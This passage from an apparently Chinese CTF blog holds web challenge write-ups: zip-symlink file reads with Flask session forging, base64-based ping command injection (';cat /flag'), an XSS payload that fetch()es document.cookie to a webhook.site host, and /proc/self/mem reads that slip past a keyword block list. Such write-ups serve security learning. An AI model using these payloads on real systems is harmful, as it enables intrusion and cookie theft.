class="line">        <span class="comment"># 拼接 UPLOAD_FOLDER（workdir/uploads）和 dirname</span></span><br><span class="line">        target_dir = os.path.join(UPLOAD_FOLDER, dirname)</span><br><span class="line">        os.makedirs(target_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">        zip_path = os.path.join(target_dir, <span class="string">&quot;upload.zip&quot;</span>)</span><br><span class="line">        file.save(zip_path)</span><br><span class="line">        <span class="comment"># 将解压文件存放在 workdir/uploads/dirname/ 下</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.system(<span class="string">f&quot;unzip -o <span class="subst">&#123;zip_path&#125;</span> -d <span class="subst">&#123;target_dir&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;解压失败，请检查文件格式&quot;</span></span><br><span class="line"></span><br><span class="line">        os.remove(zip_path)</span><br><span class="line">        <span class="comment"># 文件下载地址 /download/dirname</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;解压完成！&lt;br&gt;下载地址: &lt;a href=&#x27;<span class="subst">&#123;url_for(<span class="string">&#x27;download&#x27;</span>, folder=dirname)&#125;</span>&#x27;&gt;<span class="subst">&#123;request.host_url&#125;</span>download/<span class="subst">&#123;dirname&#125;</span>&lt;/a&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;upload.html&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>普通用户：</p>
<style>.atejcgmkbulv{zoom:80%;}</style><img src="/2025/10/10/junior/image-20250913225038087.png" class="atejcgmkbulv" alt="image-20250913225038087">

<p>admin：</p>
<p><img src="/image-20250913231927943.png" alt="image-20250913231927943"></p>
<p>利用解压软链接可读任意文件</p>
<p>利用解压软链接也可以读取任意文件夹，但是由下载路径的不同只有admin用户才能读任意文件夹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># admin 可以读文件夹</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download/&lt;folder&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">folder</span>):</span><br><span class="line">    target_dir = os.path.join(UPLOAD_FOLDER, folder)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_dir):</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line">    files = os.listdir(target_dir)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;download.html&quot;</span>, folder=folder, files=files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># user 只能读文件</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download/&lt;folder&gt;/&lt;filename&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">folder, filename</span>):</span><br><span class="line">    file_path = os.path.join(UPLOAD_FOLDER, folder ,filename)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            content = file.read()</span><br><span class="line">        <span class="keyword">return</span> Response(</span><br><span class="line">            content,</span><br><span class="line">            mimetype=<span class="string">&quot;application/octet-stream&quot;</span>,</span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&quot;Content-Disposition&quot;</span>: <span class="string">f&quot;attachment; filename=<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="number">500</span></span><br></pre></td></tr></table></figure>

<p>flask框架，可以伪造cookie，提权成为admin</p>
<p>F12 拿到 <code>session</code> 值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJyrVirKz0lVslIqLU4tUtIBU3mJuTARQ6VaAMhpC2o.aMWELw.v5h1usGUxthaNUHNEsbaahdZNzU</span><br></pre></td></tr></table></figure>

<p>利用解压软链接读文件 <code>/proc/self/environ</code> ，获取 <code>FLASK_SECRET_KEY</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/self/environ env_link</span><br><span class="line">zip --symlinks env_link.zip env_link</span><br></pre></td></tr></table></figure>

<p>获取的  <code>FLASK_SECRET_KEY</code>为 <code>&quot;#mu0cw9F#7bBCoF!&quot;</code></p>
<p>使用flask-unsign 解码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">flask-unsign</span></span><br><span class="line">flask-unsign -d -c &quot;.eJyrVirKz0lVslIqLU4tUtIBU3mJuTARQ6VaAMhpC2o.aMWELw.v5h1usGUxthaNU&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">flask-cookie.py</span></span><br><span class="line">python3 flask-cookie.py decode -c &quot;.eJyrVirKz0lVslIqLU4tUtIBU3mJuTARQ6VaAMhpC2o.aMWELw.v5h1usGUxthaNUHNEsbaahdZNzU&quot;</span><br></pre></td></tr></table></figure>

<p>得到 <code>&#123;&#39;role&#39;: &#39;user&#39;, &#39;username&#39;: &#39;user1&#39;&#125;</code>，修改为<code>&#123;&#39;role&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;</code>之后再编码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign -s --secret &quot;#mu0cw9F#7bBCoF!&quot; --cookie &#x27;&#123;&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;user1&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>然后更新cookie值，构造指向根目录 &#x2F; 的软链接，同时指定文件夹为 <code>.</code> </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s / root_link</span><br><span class="line">zip --symlinks root_link.zip root_link</span><br></pre></td></tr></table></figure>

<p>上传之后，访问 <code>/download/root_link</code> 即可获取根目录文件列表，下载flagxxxxx.txt文件即可</p>
<p>exp如下：</p>
<h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>提供 <code>ping</code> 功能，用户输入合法 <code>ip</code> 地址，返回 <code>ping</code> 的结果</p>
<p>;<style>.qamshoinyvfu{zoom:67%;}</style><img src="/2025/10/10/junior/image-20250913234250983.png" class="qamshoinyvfu" alt="image-20250913234250983"></p>
<p>根据Dockerfile提示，FLAG存放在根目录</p>
<p>用户输入 <code>ip</code> 主要在 <code>run_ping</code> 函数中进行处理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_ping</span>(<span class="params">ip_base64</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用base64.b64decode解码得到decoded_ip，并进行一系列检查</span></span><br><span class="line">        decoded_ip = base64.b64decode(ip_base64).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^\d+\.\d+\.\d+\.\d+$&#x27;</span>, decoded_ip):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> decoded_ip.count(<span class="string">&#x27;.&#x27;</span>) != <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>(<span class="number">0</span> &lt;= <span class="built_in">int</span>(part) &lt; <span class="number">256</span> <span class="keyword">for</span> part <span class="keyword">in</span> decoded_ip.split(<span class="string">&#x27;.&#x27;</span>)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ipaddress.ip_address(decoded_ip):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(decoded_ip) &gt; <span class="number">15</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 对为解码的 ip_base64 进行检查</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^[A-Za-z0-9+/=]+$&#x27;</span>, ip_base64):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 最后拼接到 command 的是 base64 -d ip_base64 的结构</span></span><br><span class="line">    command = <span class="string">f&quot;&quot;&quot;echo &quot;ping -c 1 $(echo &#x27;<span class="subst">&#123;ip_base64&#125;</span>&#x27; | base64 -d)&quot; | sh&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        process = subprocess.run(command, shell=<span class="literal">True</span>, check=<span class="literal">True</span>, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure>

<p>对解码后的 <code>decoded_ip</code> 做了一系列的检查，但是拼接到 <code>command</code> 的是未解码<code>ip_base64</code></p>
<p>关键在于找出 <code>base64.b64decode</code> 和 <code>base64 -d</code> 的区别</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编码</span></span><br><span class="line">echo -n 8.8.8.8 | base64                            # 输出 OC44LjguOA==</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 base64.b64decode 解码（python）</span></span><br><span class="line">base64.b64decode(&quot;OC44LjguOA==OC44LjguOA==&quot;).decode(&#x27;utf-8&#x27;)  # 仅输出 8.8.8.8 </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 <span class="built_in">base64</span> -d 解码</span></span><br><span class="line">echo -n &quot;OC44LjguOA==OC44LjguOA==&quot; | base64 -d      # 输出 8.8.8.88.8.8.8 </span><br></pre></td></tr></table></figure>

<p>exp如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">依次获取 8.8.8.8、<span class="string">&#x27;;ls /&#x27;</span>和<span class="string">&#x27;cat /flag&#x27;</span> 的<span class="built_in">base64</span>编码</span></span><br><span class="line">echo -n &quot;8.8.8.8&quot; | base64      # OC44LjguOA==</span><br><span class="line">echo -n &quot;;ls /&quot; | base64        # O2xzIC8=</span><br><span class="line">echo -n &quot;;cat /flag&quot; | base64   # O2NhdCAvZmxhZw==</span><br></pre></td></tr></table></figure>

<p>正常<code>ping</code> 一个<code>ip</code>地址，bp改包依次获取 根目录文件，查看<code>/flag</code>内容</p>
<p><img src="/image-20250914001106283.png" alt="image-20250914001106283"></p>
<h3 id="unfinished"><a href="#unfinished" class="headerlink" title="unfinished"></a>unfinished</h3><p>用户注册、登录之后，可写入笔记、然后提交审核，典型XSS</p>
<style>.fgarjeahbshi{zoom:80%;}</style><img src="/2025/10/10/junior/image-20250914001412760.png" class="fgarjeahbshi" alt="image-20250914001412760">

<p>flag存放在网页的cookie中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">context.add_cookies([&#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: flag_value,</span><br><span class="line">    <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;httponly&#x27;</span>: <span class="literal">True</span></span><br><span class="line">&#125;])</span><br></pre></td></tr></table></figure>

<p>关键是判断xss点，以及怎么触发</p>
<p>从<code>/profile</code>中写入的内容会被存放在当前用户的 <code>bio</code>，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        current_user.bio = request.form[<span class="string">&#x27;bio&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(current_user.bio)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;profile.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>提供 <code>/api/bio/&lt;string:username&gt;</code>访问写入的 bio，但是直接访问返回 403</p>
<p>查看 nginx.conf 配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">location /api/bio/ &#123;</span><br><span class="line">    return 403;</span><br><span class="line">&#125;</span><br><span class="line">location ~ \.(css|js)$ &#123;</span><br><span class="line">    proxy_pass http://127.0.0.1:5000;</span><br><span class="line">    proxy_ignore_headers Vary;</span><br><span class="line">    proxy_cache static_cache;      // 启用 Nginx 缓存，缓存区域叫 static_cache</span><br><span class="line">    proxy_cache_valid 200 10m;     // 缓存有效期为 10 分钟</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当请求的路径以 “.css”或者“.js”结尾时，就读取缓存的内容，而不是请求远程服务器</p>
<p>通过 <code>/view</code> 路由触发机器人通过 visit_url 函数访问 我们写入 bio 的内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/view&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_user</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    # I found a bug in it.</span></span><br><span class="line"><span class="string">    # Until I fix it, I&#x27;ve banned /api/bio/. Have fun :)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    username = request.args.get(<span class="string">&quot;username&quot;</span>,default=current_user.username)</span><br><span class="line">    visit_url(<span class="string">f&quot;http://localhost/api/bio/<span class="subst">&#123;username&#125;</span>&quot;</span>)    <span class="comment"># 访问 bio</span></span><br><span class="line">    template = <span class="string">f&quot;&quot;&quot;&#123;&#123;% extends &quot;base.html&quot; %&#125;&#125;...&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag_value = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;flag&#123;fake&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">            context.add_cookies([&#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;value&#x27;</span>: flag_value,</span><br><span class="line">                <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;httponly&#x27;</span>: <span class="literal">True</span>    <span class="comment">#  httpOnly不是httponly</span></span><br><span class="line">            &#125;])</span><br><span class="line">            ......</span><br><span class="line">            page.goto(url, timeout=<span class="number">5000</span>)    <span class="comment"># 若访问的 url 页面中存在xss，则可以带出cookie</span></span><br><span class="line">            page.wait_for_timeout(<span class="number">5000</span>)</span><br><span class="line">            browser.close()</span><br></pre></td></tr></table></figure>

<p>思路如下：</p>
<p>注册用户名：<code>user.css</code></p>
<p>将payload写入 <code>bio</code>，<code>payload</code>如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">`https://webhook.site/b615b48c-adb7-4e53-97b6-ef4b71b4fa8f/<span class="subst">$&#123;<span class="variable language_">document</span>.cookie&#125;</span>`</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问 <code>/api/bio/user.css</code> ,生成缓存</p>
<p>然后在访问 &#x2F;view ，触发机器人读取 payload，并将cookie值带出</p>
<style>.muwifkxtpgsj{zoom:80%;}</style><img src="/2025/10/10/junior/image-20250914005025512.png" class="muwifkxtpgsj" alt="image-20250914005025512">

<h3 id="peekafork"><a href="#peekafork" class="headerlink" title="peekafork"></a>peekafork</h3><p>处理HTTP请求，并根据请求的文件名和offset读取文件内容</p>
<p>flag被写入某段内存中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line">mm = mmap.mmap(-<span class="number">1</span>, <span class="built_in">len</span>(flag))</span><br><span class="line">mm.write(flag)</span><br><span class="line">os.remove(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>关键代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">FORBIDDEN = [<span class="string">b&#x27;flag&#x27;</span>, <span class="string">b&#x27;proc&#x27;</span>, <span class="string">b&#x27;&lt;&#x27;</span>, <span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;^&#x27;</span>, <span class="string">b&quot;&#x27;&quot;</span>, <span class="string">b&#x27;&quot;&#x27;</span>, <span class="string">b&#x27;..&#x27;</span>, <span class="string">b&#x27;./&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(term <span class="keyword">in</span> initial_data.lower() <span class="keyword">for</span> term <span class="keyword">in</span> FORBIDDEN):</span><br><span class="line">        conn.sendall(<span class="string">b&quot;HTTP/1.1 403 Forbidden\r\n\r\nSuspicious request pattern detected.&quot;</span>)</span><br><span class="line">        conn.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_connection</span>(<span class="params">conn, addr, log, factor=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:   </span><br><span class="line">        request_data = conn.recv(<span class="number">256</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request_data.startswith(<span class="string">b&quot;GET /&quot;</span>):</span><br><span class="line">            response = <span class="string">b&quot;HTTP/1.1 400 Bad Request\r\n\r\nInvalid Request&quot;</span></span><br><span class="line">            conn.sendall(response)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            path = request_data.split(<span class="string">b&#x27; &#x27;</span>)[<span class="number">1</span>]   <span class="comment"># 取出请求路径 </span></span><br><span class="line">            pattern = <span class="string">rb&#x27;\?offset=(\d+)&amp;length=(\d+)&#x27;</span></span><br><span class="line">            offset = <span class="number">0</span></span><br><span class="line">            length = -<span class="number">1</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(pattern, path)    <span class="comment"># 匹配 ?offset=12&amp;length=123。仅匹配第一个</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                offset = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>).decode())</span><br><span class="line">                length = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>).decode())</span><br><span class="line">                clean_path = re.sub(pattern, <span class="string">b&#x27;&#x27;</span>, path)</span><br><span class="line">                filename = clean_path.strip(<span class="string">b&#x27;/&#x27;</span>).decode()  <span class="comment"># 去除首尾 &#x27;/&#x27;，得到filename</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                filename = path.strip(<span class="string">b&#x27;/&#x27;</span>).decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> filename:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(os.path.normpath(filename), <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  <span class="comment"># 读取 filename 文件内容</span></span><br><span class="line">                    <span class="keyword">if</span> offset &gt; <span class="number">0</span>:</span><br><span class="line">                        f.seek(offset)</span><br><span class="line">                    data_bytes = f.read(length)</span><br><span class="line">                    response_body = data_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                response_status = <span class="string">&quot;200 OK&quot;</span></span><br></pre></td></tr></table></figure>

<p>读取 &#x2F;proc&#x2F;self&#x2F;maps 查看flag存放的偏移 offset</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?offset=0&amp;length=100000000000.?offset=1&amp;length=100/.?offset=1&amp;length=100.?offset=1&amp;length=100/pro?offset=1&amp;length=100c/self/maps</span><br></pre></td></tr></table></figure>

<p>得到maps：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Length: 11653</span><br><span class="line"></span><br><span class="line">7fe58e045000-7fe58e047000 r--p 00009000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fe58f5c8000-7fe58f5c9000 rw-s 00000000 00:01 5143                       /dev/zero (deleted)</span><br><span class="line">7fe58f5c9000-7fe58f5cb000 rw-p 00000000 00:00 0 </span><br><span class="line">7fe58f5cb000-7fe58f5cc000 r--p 00000000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fe58f602000-7fe58f603000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffec822a000-7ffec824b000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">7ffec83da000-7ffec83de000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffec83de000-7ffec83e0000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure>

<p>根据本地python的对比测试，<code>mmap</code>后会有一个叫做 <code>/dev/zero (deleted)</code>的内存空间被分配出来<br>根据它的地址从<code>mem</code>中读取<code>mmap</code>到的flag</p>
<p>读取 <code>/proc/self/mem</code> 文件，<code>offset</code>设置为十进制的<code>0x7fe58f5c8000</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?offset=140623929442304&amp;length=4096.?offset=1&amp;length=100/.?offset=1&amp;length=100.?offset=1&amp;length=100/pro?offset=1&amp;length=100c/self/mem</span><br></pre></td></tr></table></figure>

<p>拿到FLAG</p>
<p><img src="/image-20250914010944252.png" alt="image-20250914010944252"></p>
<h3 id="safenote"><a href="#safenote" class="headerlink" title="safenote"></a>safenote</h3><p>功能：</p>
<p>xss限制：nounce限制脚本执行</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/10/10/junior/" data-id="cuidFuavr-DITUWKXviTXOchY" data-title="n1ctf junior 2/2 web" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-n1ctf-pwn" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/09/16/n1ctf-pwn/" class="article-date">
  <time class="dt-published" datetime="2025-09-16T12:33:09.000Z" itemprop="datePublished">2025-09-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/09/16/n1ctf-pwn/">n1ctf2025_pwn</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ez-heap"><a href="#ez-heap" class="headerlink" title="ez_heap"></a>ez_heap</h1><p>保护全开</p>
<h2 id="程序逻辑："><a href="#程序逻辑：" class="headerlink" title="程序逻辑："></a>程序逻辑：</h2><ol>
<li>读入0x30的字符串，进行字符串校验：以冒号为标志split，分成四份。最后输入字符串形如：</li>
</ol>
